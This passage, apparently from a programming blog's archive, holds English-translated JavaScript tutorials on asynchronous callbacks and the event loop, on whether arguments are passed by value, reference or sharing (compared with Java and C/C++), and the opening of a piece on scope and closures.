know the file content. Or when operating a database, we want to know if the command is wrong and also want to know what the returned data is. Since we always want to know these two things asynchronously, it means that there will be at least two parameters, one is an error, and the other is a return value. The “error first” in the subtitle means that the error is usually placed in the first parameter “according to convention”, and other return values are placed in the second and subsequent parameters. Why? Because there is only one error, but there may be many return values. For example, suppose there is a function called getFileStats that will asynchronously fetch the file status and return the file name, file size, file permissions, and file owner. If err is placed as the last parameter, our callback will look like this: function cb(fileName, fileSize, fileMod, fileOwner, err) I have to write out all the parameters clearly to get err. In other words, if I only want the file name and file size today, and I don’t care about the others, what should I do? There is nothing to do. I still have to write it so long because err is the last one. If err is placed first, I only need to write: function cb(err, fileName, fileSize), and I don’t need to write the later parameters if I don’t want to take them. This is why err should be placed at the beginning, because we will always need err, but we may not need all the later parameters. Therefore, whenever you see a callback function, the first parameter usually represents an error message. So it is very common to see this processing method, first check if there is an error and then do other things: const fs = require('fs') fs.readFile('./README.md', (err, data) => &#123; // 如果錯誤發生，處理錯誤然後返回，就不會繼續執行下去 if (err) &#123; console.log(err) return &#125; console.log(data) &#125;); Finally, there are three points to supplement. The first point is that “error first” is just a “convention”. The actual parameters passed depend on the document. You can also write an API that puts the error as the last parameter (but you shouldn’t do that). The second point is that although it is asynchronous, it is still possible to catch errors using try catch, but the “type” of the error is different, for example: const fs = require('fs') try &#123; // 讀取檔案 fs.readFile('./README.md') &#125; catch(err) &#123; console.log('讀檔失敗') console.log(err) // TypeError [ERR_INVALID_CALLBACK]: Callback must be a function &#125; The error caught here is not the error generated by “reading the file”, but the error generated by “calling the read file this function”. Using the restaurant example mentioned earlier, it is like you know that the beef noodles are sold out when the customer orders, so you don’t need to ask the back kitchen, you can directly tell the customer: “Sorry, our beef noodles are sold out. Would you like to consider ordering something else?” The last point I want to add is that some people may ask: “Then why don’t setTimeout or event listeners have the err parameter?” That’s because the application scenarios of these few things are different. The meaning of setTimeout is: “After n seconds, please call this function”, and the meaning of the event listener is: “When someone clicks the button, please call this function”. These two things will not cause errors. But when using readFile to read a file, errors may occur when reading the file; and XMLHttpRequest has onerror to catch asynchronous errors. To summarize: The parameters of the callback function are the same as those of the general function, and they are based on “order” rather than name, and they are not so smart. According to convention, the first parameter of the callback function is usually err, which is used to tell you whether an error has occurred (according to the first point, you can call it e, error, or fxxkingError). Although it is asynchronous, it is still possible to catch errors using try catch, but that means that an error occurred when “calling the asynchronous function”. Understanding the last puzzle of asynchronous: Event loopWe have talked so much about asynchronous, have you ever thought about how asynchronous is done? Isn’t it often heard that JavaScript is single-threaded and only one thread is running? But if it is really single-threaded, how can it achieve asynchronous? If you want to understand how asynchronous operations work, I highly recommend this video: What the heck is the event loop anyway? | Philip Roberts | JSConf EU. Everyone who has watched it has praised it. Once you’ve watched the video, you’ll understand how asynchronous operations work. Since the video is so well done, I’ll just summarize the key points below. Please watch the video before reading on. If you haven’t watched it yet, please do so. In the execution of a program, there is something called the call stack, which basically records the resources needed for each function to execute, as well as the order in which functions are executed. For example, consider the following code: function a() &#123; return 1 &#125; function b() &#123; a() &#125; function c() &#123; b() &#125; c() We first call c, so the call stack looks like this (the example below will grow upwards): c c calls b: b c b calls a: a b c After a is executed, which function should it return to? It’s simple, remove a from the call stack, and the one on top is the one to return to: b c Then b is executed and removed from the call stack: c Finally, c is executed, the call stack is cleared, and the program ends. The call stack is where the order of function execution and other necessary things are recorded, and the well-known error stack overflow refers to when the stack is too full, such as when you recursively call a function 100,000 times and the stack can’t store so many things, resulting in a stack overflow error. JavaScript’s “only one thread” means that there is only one call stack, so only one thing can be executed at a time. So how does asynchronous programming work? I only said that “JavaScript can only do one thing at a time,” but I didn’t say that “the execution environment is the same.” For example, when reading a file, we can explain the asynchronous file reading code as “ask the system to read the file, and after the file is read, pass the result back through the callback function.” Behind the scenes, Node.js can use another thread to read the file, which is completely fine. setTimeout is also the same. setTimeout(fn, 2000) just tells the browser, “Call the function fn after 2 seconds,” and the browser can use another thread to time it, rather than using the main thread. The key is, when these other threads are done, how do they get back to the main thread? Because only the main thread can execute JavaScript, it must be returned, otherwise it won’t run. This is what the event loop does. Let’s start with a classic picture: (Image source: Understanding Event Loop, Call Stack, Event &amp; Job Queue in Javascript with a screenshot of codepen) Let’s first explain the right side. Suppose we execute the code setTimeout(fn, 2000). We first put setTimeout(fn, 2000) into the call stack to execute, and then setTimeout belongs to the Web API, so it will tell the browser, “Hey, set a timer for me, call fn after 2000 milliseconds,” and then it ends and is popped out of the call stack. When the browser’s timer is up, it will put fn into the callback queue. Why is there a queue here? Because there may be many callback functions waiting to be executed, so there needs to be a queuing mechanism for everyone to line up here, one by one, so it’s called a callback queue, not a callback array or callback stack. Then comes the key event loop, which plays a very simple role, which can be explained in plain language: Continuously detect whether the call stack is empty. If it is empty, put the things in the callback queue into the call stack. From a programming perspective, the reason why the event loop is called a loop is because it can be represented like this: while(true) &#123; if (callStack.length === 0 &amp;&amp; callbackQueue.length > 0) &#123; // 拿出 callbackQueue 的第一個元素，並放到 callStack 去 callStack.push(callbackQueue.dequeue()) &#125; &#125; That’s it, it’s that simple. It’s like many famous museums have crowd control. You have to buy a ticket first and then queue up. Then the guard at the door will let the people in the queue in when they see that the people in front have already moved on to the next attraction. while(true) &#123; if (博物館入口沒有人 &amp;&amp; 排隊的隊伍有人) &#123; 放人進去博物館() &#125; &#125; The key point to remember here is that “asynchronous callback functions are first placed in the callback queue and are only thrown into the call stack by the event loop when the call stack is empty.” The event loop is like a person who only talks and doesn’t do anything. It is not responsible for executing the callback function, it only helps you throw the function into the call stack, and the main thread of JavaScript is the one that actually executes it. After understanding the event loop mechanism, we can explain asynchronous behavior. The video has already explained it clearly, so I won’t go into too much detail. I’ll just give a common example: setTimeout(() => &#123; console.log('0ms') &#125;, 0) console.log('hello') Will “hello” be printed first, or will “0ms” be printed first, or is it uncertain? If your answer is not “hello will be printed first”, it means that you haven’t understood the event loop mechanism, so please go back and watch the video again. The callback function in the above example will be placed in the callback queue after 0ms, but please note that the call stack is not empty at this time, so console.log(&#39;hello&#39;) will be executed first. After it is executed, the call stack is cleared, and then the event loop throws the callback into the call stack and then executes console.log(&#39;0ms&#39;) inside the callback. So the output order is guaranteed to be “hello” first, followed by “0ms”. Finally, a few small supplements. The first is that passing 0 to setTimeout means “execute as soon as possible”, but it may not trigger after 0ms, it may be 4ms or longer. For details, please refer to: MDN: Reasons for delays longer than specified The second supplement is that the event loop actually has a small detail, which is that the callback queue is also divided into two types: macro tasks and micro tasks, but this is a bit complicated, so I’ll talk about it later. The third supplement is that although both Node.js and browsers have event loops, just like they both have setTimeout, the underlying principles and implementations are different. They are generally the same, but the details are different. The fourth supplement is that the statement “only the main thread can execute JavaScript” is not correct, because there is a Web Worker in the browser that can be used. Asynchronous QuizAfter understanding the principle of the event loop for asynchronous operations, you should be quite familiar with the execution of asynchronous operations. Below, I will give some questions to verify whether you really understand: 1. Event WebsiteXiao Ming is a front-end engineer at a website that specializes in events. He was assigned a task by his supervisor to add a piece of code to call the backend API to get whether the event has started, and only go to the event page if it has started, otherwise do nothing. Assuming that getAPIResponse is an asynchronous function that uses ajax to call the API and then gets the result, and the /event API returns JSON format data, where the started boolean field represents whether the event has started. So Xiao Ming wrote the following code: // 先設一個 flag 並且設為 false，表示活動沒開始 let isEventStarted = false // call API 並取得結果 getAPIResponse('/event', response => &#123; // 判斷活動是否開始並設置 flag if (response.started) &#123; isEventStarted = true &#125; &#125;) // 根據 flag 決定是否前往活動頁面 if (isEventStarted) &#123; goToEvent() &#125; Question: Is there any problem with this code? If so, where is the problem? 2. Waiting SlowlyAfter completing the event website, Xiao Ming felt that he still wasn’t very familiar with asynchronous operations, so he wanted to practice and wrote the following code: let gotResponse = false getAPIResponse('/check', () => &#123; gotResponse = true console.log('Received response!') &#125;) while(!gotResponse) &#123; console.log('Waiting...') &#125; The meaning is that “waiting” will be continuously printed before the ajax response comes back, and it will stop only after receiving the response. Question: Can the above code meet Xiao Ming’s needs? If not, please explain why. 3. Strange TimerThe supervisor assigned Xiao Ming to fix a bug in the company’s code. He found this code block: setTimeout(() => &#123; alert('Welcome!') &#125;, 1000) // 後面還有其他程式碼，這邊先略過 What is the bug? The timer is supposed to display a message after 1 second, but after executing this code block (note that there is other code below, which is skipped for now), the alert only appears after 2 seconds. Question: Is this possible? Regardless of whether you think it is possible or not, please try to explain why. 4. Execution Order Testa(function() &#123; console.log('a') &#125;) console.log('hello') Question: What is the final output order? Is it “hello” then “a”, or “a” then “hello”, or is it uncertain? Answer: 1. Event WebsiteThe answer is problematic. This code block mixes synchronous and asynchronous code, which is the most common mistake. The event loop will only put the callback into the call stack when the call stack is empty. Therefore, the code that checks isEventStarted will be executed first. When this code is executed, even though the response has returned, the callback function is still waiting in the callback queue. Therefore, when checking isEventStarted, it will always be false. The correct method is to put the logic for checking whether the event is started inside the callback, which ensures that the response is received before checking: // call API 並取得結果 getAPIResponse('/event', response => &#123; // 判斷活動是否開始並設置 flag if (response.started) &#123; goToEvent() &#125; &#125;) Answer: 2. Wait SlowlyThe answer is no. Remember the condition of the event loop? “When the call stack is empty, put the callback into the call stack.” while(!gotResponse) &#123; console.log('Waiting...') &#125; This code block will execute continuously, becoming an infinite loop. Therefore, the call stack is always occupied, and the things in the callback queue cannot be put into the call stack. Therefore, regardless of whether Xiao Ming’s original code has received a response or not, it will only print “waiting” continuously. Answer: 3. Strange TimerThe answer is possible. WebAPI will put the callback into the callback queue after one second. So why does it take two seconds to execute? Because the call stack is occupied for one second. As long as the code below setTimeout does a lot of things and occupies one second, the callback will be put into the call stack after one second, for example: setTimeout(() => &#123; alert('Welcome!') &#125;, 1000) // 底下這段程式碼會在 call stack 佔用一秒鐘 const end = +new Date() + 1000 while(end > new Date())&#123; &#125; Therefore, setTimeout can only guarantee that it will execute “at least” after 1 second, but cannot guarantee that it will execute exactly after 1 second. Answer: 4. Execution Order TestThe answer is uncertain. Because I didn’t say whether a is synchronous or asynchronous, don’t assume it’s asynchronous just because there is a callback. My a can be implemented like this: function a(fn) &#123; fn() // 同步執行 fn &#125; a(function() &#123; console.log('a') &#125;) console.log('hello') The output will be “a” then “hello”. It can also be implemented like this: function a(fn) &#123; setTimeout(fn, 0) // 非同步執行 fn &#125; a(function() &#123; console.log('a') &#125;) console.log('hello') The output will be “hello” then “a”. ConclusionTo understand asynchronous programming, you must take it step by step and not try to rush it. This is also why the title is called “Become a Callback Master First”, because you must have a certain level of proficiency with callbacks before moving on to the next stage, which will make it much easier. This article mainly aims to establish several important concepts for everyone: What is blocking? What is non-blocking? What is synchronous? What is asynchronous? What is the difference between synchronous and asynchronous? Why do we need asynchronous programming? What is a callback? Why do we need callbacks? The error-first convention of callbacks What is the event loop? What does it do? What are the common pitfalls of asynchronous programming? If you can fully understand this article and thoroughly understand the quiz at the end, I believe you should have no problem understanding asynchronous programming, and implementation will be much smoother. After understanding the basics of asynchronous programming and callbacks, the next article will discuss the problems and solutions encountered when using callback functions: Promises, and also briefly mention the newer syntax async&#x2F;await. (There is currently no sequel, but I will add it when it is available.) References: Overview of Blocking vs Non-Blocking What are callbacks? What are the error conventions? 你懂 JavaScript 嗎？#23 Callback What the heck is the event loop anyway? | Philip Roberts | JSConf EU","link":"/2019/10/04/en/javascript-async-sync-and-callback/"},{"title":"A Deep Dive into Parameter Passing in JavaScript: Call by Value or Reference?","text":"IntroductionOriginally, I was planning to write about the differences and implementations of shallow and deep copying. However, while researching, I stumbled upon articles related to call by value and call by reference, and the more I delved into it, the more interesting it became. I thought I had understood this issue, but the more I read, the more confused I became. There are two ways to write this article. One is to record in detail my process of researching this issue, my doubts, and how I arrived at a solution, essentially writing in chronological order. The other is to organize my findings and express them in a simpler and more understandable way. In the past, I have mostly taken the second approach, reorganizing and summarizing my findings to write an article that is relatively easy to understand, leading readers step by step through my thought process to arrive at a solution. However, this time I want to try the first approach, taking readers through the materials I usually read when writing articles and explaining my thought process. This should be quite interesting. Let’s go! Beautiful MistakesAs mentioned earlier, my decision to research parameter passing was a beautiful mistake. I was originally planning to write about shallow and deep copying. While researching, I came across this article: [Javascript] 關於 JS 中的淺拷貝和深拷貝 . After reading it, I realized that if I wanted to talk about deep copying, I would have to first explain why we need deep copying, which would require discussing the differences between objects and other primitive types. At this point, I thought of an old question: Is JavaScript’s object passed by value or by reference? I vaguely remembered that the answer was the former, or neither, but rather a new term called pass by sharing. To verify that my memory was correct, I continued to search and finally found [筆記] 談談JavaScript中by reference和by value的重要觀念 and 重新認識 JavaScript: Day 05 JavaScript 是「傳值」或「傳址」？. I remembered reading the latter and confirmed that my memory was correct. Okay, before we continue, I need to introduce these three terms and their differences, otherwise we won’t be able to proceed. Parameter Passing in FunctionsLet’s start with a simple example: function swap(a, b) &#123; var temp = a; a = b; b = temp; &#125; var x = 10; var y = 20; swap(x, y); console.log(x, y) // 10, 20 After executing swap, the values of x and y are not swapped. Why? Because what you passed in was not “the real x and y,” but rather “copies of the values of x and y.” In other words, a and b are actually two new variables that store the same values as x and y, but changing a will not change x because they are two different variables. You can refer to the beautiful animation below: This method is called call by value (or pass by value), which copies the “value” when calling a function. Up to this point, it should be quite easy to understand. Now we will slowly move on to the more complex parts. There is another method called call by reference, which means “what you passed in is the real x and y, and a and b inside the function are just aliases, changing a will change x.” Obviously, for primitive types like numbers in JavaScript, there is no call by reference, because you can never change variables outside the function through arguments inside the function. What about objects? function add(obj) &#123; obj.number++ &#125; var o = &#123;number: 10&#125; add(o) console.log(o.number) // 11 What! You actually successfully changed something outside the function inside the function! Is this call by reference? Don’t be hasty. At first glance, it seems like it, but there is an operation that exposes a flaw: function add(obj) &#123; // 讓 obj 變成一個新的 object obj = &#123; number: obj.number + 1 &#125; &#125; var o = &#123;number: 10&#125; add(o) console.log(o.number) // 10 If it is really call by reference, then if you change the value of obj inside the function, the value of o outside will also be changed and become the new object. However, from the example above, it doesn’t seem to be the case, so this is not call by reference. Neither call by value nor call by reference, so what should we call it? Some people call this method call by sharing, which means that we let the obj inside the function “share” the same object as o outside, so you can modify the data of the “shared object” through the obj inside. Although it looks no different from call by reference, the biggest difference is that if you reassign obj inside the function, it means that you want this obj to point to a new object, so o outside still retains its original value. After introducing a new term, it seems that all the problems have been solved, and the conclusion is: “In JavaScript, primitive types are call by value, and objects are call by sharing.” However, all of this is just my naive idea. One day, I saw a sentence… JavaScript only has call by valueAt first glance, this sentence makes no sense. Didn’t we just say it’s call by sharing? How did it become call by value again? But actually, this sentence should be interpreted as follows: When you declare an object, in the underlying implementation, this object actually stores a memory location, or if you use C to explain it, the underlying of the object is a pointer. Let’s review pointers first. You can think of pointers as a type of variable, but the difference is that the value it stores is a “memory location”. What is the value of the variable o? The answer to this question is the key to understanding the sentence “JavaScript only has call by value”. From a higher level, the answer will naturally be “the value of o is {number: 10}”. But if you look at it from the underlying implementation, the answer will be “the value of o is 0x01”. Let’s continue with the second answer. Assuming the value of o is 0x01, then when you call the function, the value passed in is actually 0x01, so the variable inside the function can operate on the same thing through this memory location. It’s just like the picture we drew before, o and obj two variables will “point to” the same place. The underlying implementation principle is to pass the memory location of o to obj, otherwise how can they point to the same place. If you look at it from this perspective, call by sharing (passing memory location) is actually a kind of call by value, and the explanation is: it is actually passing a copy of the value, but this value is a memory location. At first glance, it makes sense, but there is one point that I can’t figure out no matter how I think: If you look at it from the underlying implementation, isn’t call by reference also a kind of call by value? Because from the underlying implementation, call by reference is also passing the memory location, so doesn’t that mean the whole world only has call by value? Later, I found an article with a similar idea: Re: [問題] 請問傳參考到底是什麼? But after reading it, I still didn’t get an answer, only a vague concept. I think this may be a problem of naming conventions. With the spirit of exploring the root cause, I decided to see what ECMAScript says. Journey to explore the BibleThe ECMAScript spec is the Bible of JavaScript, where you can find deeper implementation details, and the content will never be wrong. Most of the related articles I can find now are sourced from here: ECMA-262-3 in detail. Chapter 8. Evaluation strategy. I originally thought this was an excerpt from ECMA-262-3, but after reading it, I found that it was not. It was just someone’s notes after reading ECMA-262-3. However, this article is actually well written. We can directly look at the conclusion part: It can be either “call by value”, with specifying that the special case of call by value is meant — when the value is the address copy. From this position it is possible to say that everything in ECMAScript are passed by value. Or, “call by sharing”, which makes this distinction from “by reference”, and “by value”. In this case it is possible to separate passing types: primitive values are passed by value and objects — by sharing. The statement “objects are passed by reference” formally is not related to ECMAScript and is incorrect. Unfortunately, it does not specify which part of ECMA-262 mentions these, and no article I searched for had any reference to ECMA-262. I had to find it myself. I downloaded ECMA-262 edition 8 from ecma international and used a few keywords to search for: call by reference call by value pass by reference pass by value The result? I found nothing. I then narrowed down the keywords and searched for reference, sharing, and so on, and found 6.2.4 The Reference Specification Type, which seemed relevant but did not contain the most crucial part. Searching through an 800-page document like this was exhausting, and I still had no results. I then thought, “Let me search for arguments,” and found two seemingly relevant sections (9.4.4 ArgumentsExoticObjects and 9.2 ECMAScript Function Objects), but they did not provide detailed explanations. Since I couldn’t find anything using the previous keywords, I decided to try searching for the definition of the equal sign. If we want to compare two objects, we should find something about how to compare whether two objects are the same, which should mention related terms like reference! Finally, I found this section: If x and y are the same Object value, return true. Otherwise, return false. Okay, it’s as good as not saying anything. After searching for an hour or two and making little progress, I decided to give up on this nearly 900-page version. Later, I downloaded the first edition of ECMA-262, which is much shorter, with less than 200 pages. After searching for several keywords and finding no results, I decided to quickly scan the entire book. In conclusion, I still did not find anything related to call by value&#x2F;reference, but I found some interesting things. For example, the way to determine equality is written differently: 11.9.3 The Abstract Equality Comparison Algorithm 13.Return true if x and y refer to the same object or if they refer to objects joined to each other (see 13.1.2). Otherwise, return false. There is a mention of something called “joined objects”: However, it is still not quite what we are looking for. So, I gave up on the idea of finding the answer from ECMAScript. Feeling helpless, I remembered a programming language that also had a similar problem (whether it is call by value or call by reference): Java. Java is always pass-by-valueI have encountered this problem before when writing Java, and it is actually exactly the same as JavaScript. When you pass a normal value, it is passed by value, but when you pass an object, it behaves like call by reference. However, when assigning a value, it does not change the outside object. But it seems that it is a consensus that Java is always pass by value, which can be referred to in Is Java “pass-by-reference” or “pass-by-value”?, Parameter passing in Java - by reference or by value?, and Java is Pass-by-Value, Dammit!. The reason is actually the same as what we said at the beginning. Let me quote a sentence from Java is Pass-by-Value, Dammit!: However, Objects are not passed by reference. A correct statement would be Object references are passed by value. And a paragraph from Parameter passing in Java - by reference or by value?: Now that we have some definitions of terms we can return to the question. Does Java pass objects by reference or by value? The answer is NO! The fact is that Java has no facility whatsoever to pass an object to any function! The reason is that Java has no variables that contain objects. The reason there is so much confusion is people tend to blur the distinction between an object reference variable and an object instance. All object instances in Java are allocated on the heap and can only be accessed through object references. So if I have the following: StringBuffer g &#x3D; new StringBuffer( “Hello” ); The variable g does not contain the string “Hello”, it contains a reference (or pointer) to an object instance that contains the string “Hello”. The value of the variable g is not the string “Hello”, but “a reference to the string Hello”, so when you call a function, you pass in this reference. I pass in a reference, but this is not called call by reference? It sounds super strange, but the root cause is actually “this reference is not that reference”. Let me quote a paragraph from Call by value?: In Java, Call by value refers to passing the value stored in a variable as a parameter, regardless of whether it is a primitive type or a class declaration type. Java does not allow the handling of memory addresses, so the term “reference” is used to explain the behavior of variables declared as class types. However, this “reference” is completely different from the “reference” in C++, and there is no Call by reference behavior in C++ for passing parameters by value, passing by reference, returning by value, or passing by reference. Although what we pass in is indeed a reference, it is not the same as the “call by reference” in C++, so it cannot be called “call by reference.” This paragraph is similar to what is mentioned in “11.2. By Value Versus by Reference” in the Rhino book: Before we leave the topic of manipulating objects and arrays by reference, we need to clear up a point of nomenclature. The phrase “pass by reference” can have several meanings. To some readers, the phrase refers to a function invocation technique that allows a function to assign new values to its arguments and to have those modified values visible outside the function. This is not the way the term is used in this book. Here, we mean simply that a reference to an object or array – not the object itself – is passed to a function. A function can use the reference to modify properties of the object or elements of the array. But if the function overwrites the reference with a reference to a new object or array, that modification is not visible outside of the function. Readers familiar with the other meaning of this term may prefer to say that objects and arrays are passed by value, but the value that is passed is actually a reference rather than the object itself. Now, let’s review C and C++ parameter passing. In C, there is only one type: call by value. As we mentioned earlier, this does not exchange the values of x and y because a and b only store the same values as x and y, respectively, and have no other relationship. However, in C, there is something called a “pointer” that can store memory locations. Through pointers, we can actually change the values of external variables inside a function. This is still called call by value. If you are still unsure why, you can refer to the following example. The difference from the previous example is that I first declare two pointers pointing to x and y: Do you remember the definition of call by value mentioned earlier? It is to copy the value of a variable and pass it in. The same applies here. We pass in two variables ptr_x and ptr_y that store the memory locations of x and y, respectively, and when we call the function, we copy these two “values” and pass them in. Therefore, the values printed out for a and b in the function will be the same as the values stored in ptr_x and ptr_y. In simple terms, previously when we used call by value, the “value” could be a number or a string. In the current example, the value is a “memory location,” which is also a type of data. However, some people also refer to this as call by pointer or call by address, but in principle, it is still a type of call by value. One thing to note here is that even though a and ptr_x have the same “value,” they are still different variables with different memory locations. Now let’s see how call by reference works in C++. Just add &amp; to the function’s argument to make it call by reference: #include &lt;stdio.h&gt; &#x2F;&#x2F; 注意到這邊多了 &amp;，其他都跟 call by value 一模一樣 void swap(int &amp;a, int &amp;b) &#123; &#x2F;&#x2F; 印出 a 跟 b 所存的值與記憶體位置 printf(&quot;%ld, %ld\\n&quot;, a, b); &#x2F;&#x2F; 10, 20 printf(&quot;%ld, %ld\\n&quot;, &amp;a, &amp;b); &#x2F;&#x2F; 0x44, 0x40 int temp &#x3D; b; b &#x3D; a; a &#x3D; temp; &#125; int main()&#123; int x &#x3D; 10; int y &#x3D; 20; &#x2F;&#x2F; 印出 x 跟 y 的記憶體位置 printf(&quot;%ld %ld\\n&quot;, &amp;x, &amp;y); &#x2F;&#x2F; 0x44, 0x40 swap(x, y); &#x2F;&#x2F; 傳記憶體位置進去 printf(&quot;%d %d\\n&quot;, x, y); &#x2F;&#x2F; 20, 10 &#125; Here, the memory locations of a and b are exactly the same as x and y, respectively. This means that when we operate on the variable a inside the function, we are actually operating on the variable x. They are identical, just with different names. When a is reassigned, the value of x outside the function is also changed. After seeing the differences between pass by value and pass by reference in C and C++, my initial question, “If you look at it from the perspective of low-level implementation, isn’t call by reference also a type of call by value?” has been answered. I think the biggest difference between these two is one thing: copying. Call by value will copy the value passed in (whether it’s a number or a memory location, it will be copied). Call by reference will also have similar behavior at the “lowest level of implementation,” but you won’t notice it. As in the example of call by reference above, the memory location of x is the same as that of a, and the memory location of y is the same as that of b. Therefore, you can say that they are “identical” things. However, in the case of call by value, even if you pass a pointer, the pointer itself still has a different memory location, even though the “value inside the pointer (i.e., the memory location it points to)” is the same. In other words, when we use call by value, we “create a new variable a and make it store the same value as the parameter passed in.” In call by reference, we only “make a an alias of x, and both are the same variable.” This is the biggest difference between the two in my opinion. ConclusionWe have seen the implementation of each programming language, but is there a clear definition that can distinguish between pass by value and pass by reference? I thought about it and realized that we can judge based on their behavior. Instead of looking at the definition, it’s better to distinguish them based on their behavior, as different types can achieve different behaviors. The first criterion is used to distinguish whether it is pass by value or pass by reference: “When the argument is reassigned inside the function, does the external variable change?” In JavaScript and Java, for example, when you reassign a variable inside a function, the external variable does not change, so it belongs to pass by value. If you want to distinguish them further, you can use the second criterion to distinguish whether this pass by value is true pass by value or a branch called pass by sharing: “Can you change the value of an external variable through an argument?” (The “value” we are referring to here is unrelated to the address or reference, purely referring to values like &#123;numer:1&#125;) In JavaScript and Java, you can change the value of an external variable through operations like obj.number = 10 (where obj.number changes from 1 to 10), so it can also be called pass by sharing. According to the first criterion, some people may notice that if it’s a pointer in C, can’t it also achieve this? However, C only has call by value, so isn’t there a conflict? But in fact, in the example of pointers, the object we are reassigning is *a instead of a (meaning that we are making *a=10 instead of a=10). The latter is called reassigning the argument (giving a a new address), while the former is “reassigning the memory location pointed to by the pointer.” So according to this definition, the example of pointers is still pass by value. Depending on the level of detail, the following statements are all correct: JavaScript only has pass by value Primitive types in JavaScript are pass by value, and objects are pass by sharing ConclusionTo be honest, after researching so much information, I found that everyone’s “definition” of call by reference and call by value is not exactly the same, and there is no authoritative source to guarantee that this definition is correct (maybe there is, but I didn’t find it. If you know, please tell me where it is, thank you). This has caused so much ambiguity. Regarding the explanation of technical terms, I like to quote this article: Technical term disputes are common: In the world of software development, the creation of terms is often arbitrary. One of the frequently debated questions in Java is whether there is “Pass by reference” or not. Nowadays, the generally accepted answer is that there is not, Java only has Pass by value. However, some people still face confusion when the term “reference” appears frequently in Java documents. In essence, the definition of this term is different from the definition of “reference” in C++. Java just used the term “reference” for some reason. The point is not to clarify Pass by value, but to understand what behavior occurs when manipulating objects through parameters. We studied from JavaScript to Java, and then from Java to C and C++, just to understand the definition of “pass by reference”. However, ultimately, this misunderstanding is caused by different definitions of the term “reference”. If you understand “pass by reference” as defined in C++, then neither Java nor JavaScript will have pass by reference. But if you understand the “reference” in “pass by reference” as “reference to an object”, then passing an object in JavaScript is actually passing a “reference to the object”, which can be interpreted as pass by reference. The term “reference” is just too convenient, leading to different definitions in different places, which are often similar but not exactly the same. But don’t forget, the point is not in this, but to understand what behavior occurs when manipulating parameters. You need to know that when you pass an object into JavaScript, you can change the value of the original object, but reassigning it will not affect the external object. Once you understand this, I think the rest is not that important. This time I wrote a topic that is easy to provoke debate, but I also think it’s quite interesting. If you have a different opinion on this issue, or if you think I made a mistake somewhere, please feel free to correct me. Thank you. References [Javascript] About shallow copy and deep copy in JS [Note] Talking about the important concepts of by reference and by value in JavaScript Reacquaint with JavaScript: Day 05 Is JavaScript “pass by value” or “pass by reference”? Re: [Question] What is passing by reference? ECMA-262-3 in detail. Chapter 8. Evaluation strategy. A simple introduction to JavaScript parameter passing Is JavaScript pass-by-value or pass-by-reference? Values vs References semantics #160 You Don’t Know JS: Types &amp; Grammar Chapter 2: Values Parameter passing in Java - by reference or by value? Is Java “pass-by-reference” or “pass-by-value”? Pass by value Call by value? The classic problem in Java: pass by value or pass by reference Java is Pass-by-Value, Dammit! 11.2. By Value Versus by Reference","link":"/2018/06/23/en/javascript-call-by-value-or-reference/"},{"title":"All Functions are Closures: Discussing Scope and Closure in JS","text":"IntroductionPlease forgive me for using a somewhat sensational title, because I really can’t think of any other title that is better. In the end, I chose a controversial title, but it is also interesting to use such a title to stimulate discussion. Moreover, what I said is based on facts. Before reading this article, please read the previous article: I know you understand hoisting, but do you understand it deeply?, because the content of the article is partly related, so you must have the concept of Execution Context and Variable Object before you can absorb the content of this article. If you are only interested in the sentence in the article title: “All Functions are Closures”, you can scroll down directly, because to talk about closures, we must start with scope, so this article will not be too short according to convention, and there will be a certain degree of elaboration in the front. Okay, let’s start with scope. ScopeWhat is scope? My favorite explanation is: “Scope is the range of life of a variable. Once it is out of this range, the variable cannot be accessed.” Let’s take a simple example: function test()&#123; var a = 10 &#125; console.log(a) // Uncaught ReferenceError: a is not defined Before ES6, the only way to create scope was through functions. Each function has its own scope, and you cannot access the variables defined inside the function outside the scope. However, in ES6, let and const were introduced, which have block scope, but that is not the focus of this article, so I will skip it for now. In addition to this function scope, there is also a scope called global, which is actually what we often call “global” or “global variable”, which can be accessed anywhere, as shown in the following example: var I_am_global = 123 function test() &#123; console.log(I_am_global) // 123 &#125; test() From the above example, you can find an interesting thing, that is, you can access variables outside the function inside the function, but you cannot enter the function from outside. Here, I want to quote a very interesting explanation I saw before, which compares scope to a celebrity and function to a region. Global variables are international superstars, such as Tom Cruise. Everyone knows this person wherever they go because he is so famous. The variables inside the function are like your neighbor who sings well. Everyone in the community knows his existence, but once he leaves the community (exceeds this function), no one knows who he is. So the structure of the function layer by layer is like a region. The outermost layer is the earth, followed by the five continents, Asia, Taiwan, Taipei City, Daan District, and Daan Forest Park. People who exercise in Daan Forest Park know their friends who often jog there and also know the celebrities in Taipei City, but people living in Taipei City may not necessarily know who the district chief of Daan District is because it is beyond their scope. The above statement can be converted into code like this: function taiwan() &#123; var taiwan_star = 'taiwan_star' function taipei() &#123; function daan() &#123; var daan_star = 'daan_star' console.log(taiwan_star) // taiwan_star &#125; daan() console.log(daan_star) // Uncaught ReferenceError: daan_star is not defined &#125; taipei() &#125; taiwan() So now you should have a better understanding of the term scope, which is the range of life of a variable. Once it exceeds that range, it cannot be accessed. The range is the function itself and its interior. Therefore, if you declare a variable inside a function, it cannot be accessed outside the function. You cannot access the outside from the inside, but the “inside” can access the “outside”: function test() &#123; var a = 100 function inner() &#123; console.log(a) // 100 &#125; inner() &#125; test() For the function inner, a is not its own variable, and this kind of variable that is not in its own scope and is not passed in as a parameter can be called a free variable, which can be translated as a free variable (it sounds cool). For inner, a is a free variable. What will be the value of a? Because a cannot be found in the scope of inner, it will look for it in the scope of test. If it still cannot be found, it will continue to look up the scope chain until it is found. Therefore, you can find that this will form a “scope chain”, inner function scope -&gt; test function scope -&gt; global scope, constantly looking up this chain. If it still cannot be found in the end, an error will be thrown. By this point, you should have a basic understanding of the concept. Next, I will ask a question to disrupt and confuse your understanding: var a = 100 function echo() &#123; console.log(a) // 100 or 200? &#125; function test() &#123; var a = 200 echo() &#125; test() Should the final log output of a be 100 or 200? I know! It’s 100, because the a in the global variable is 100…wait, but when I was in test, I declared a variable named a and set it to 200, and the a in echo may also be 200…it’s so confusing. The answer is 100. You just need to follow the principles we mentioned earlier. The “a” inside the “echo” function is the same as the global “a”, and has nothing to do with the “a” inside the “test” function. However, it is reasonable to be confused because in some programming languages, “a” will indeed be 200! The final value of “a” (or in other words, how the value of the free variable is determined) is related to how the programming language determines the “scope”. The method we introduced at the beginning is called static scope. Why is it called “static”? It means that the scope has nothing to do with where the function is “called”. You can see the scope of the function by looking at the structure of the code, and it will not change. For example, in the above example, the “a” printed out will be the global “a”, even though I declared another “a” inside the “test” function and called the “echo” function. This has nothing to do with the scope. The static scope is determined when the function is “declared”, not when it is “executed”. On the other hand, if the programming language uses dynamic scope, the value of “a” logged out will be 200 instead of 100. In other words, the value of “a” inside the “echo” function is dynamically 